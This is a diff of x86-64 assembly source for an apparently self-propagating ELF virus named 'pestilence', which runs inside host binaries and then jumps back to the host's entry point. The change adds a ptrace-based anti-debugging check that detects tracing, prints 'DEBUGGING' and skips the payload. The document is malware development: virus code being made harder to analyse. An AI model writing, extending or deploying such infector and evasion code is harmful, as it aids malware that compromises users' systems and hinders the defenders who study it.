@@ -19,6 +19,13 @@ _start:
 		; Allocate space in stack for pestilence struct
 		enter s_pestilence_size, 0
 
+		; Simple Anti Debug
+		mov rax, SYSCALL_PTRACE
+		xor rdi, rdi
+		syscall
+		cmp rax, -1
+		je antiDebugging
+
 		call findDaemonProcess
 		cmp rax, 0
 		jnz finish
@@ -115,6 +122,14 @@ die:
 		mov rax, SYSCALL_EXIT
 		mov rdi, 0
 		syscall
+
+antiDebugging:
+		mov rax, SYSCALL_WRITE
+		mov rdi, 1
+		lea rsi, [rel debugMessage]
+		mov rdx, DEBUG_MESSAGE_SIZE
+		syscall
+		jmp finish
 
 ; Get address of host entry and jump to it [Parent]
 jumpToHost:
@@ -582,6 +597,7 @@ data:
 	processDirectory: db "/proc/", 0
 	processStatFile: db "/stat", 0
 	daemonName: db "(daemon)", 0
+	debugMessage: db "DEBUGGING", 0
 	payloadEntry: dq _start
 	hostEntry: dq die
 _end:
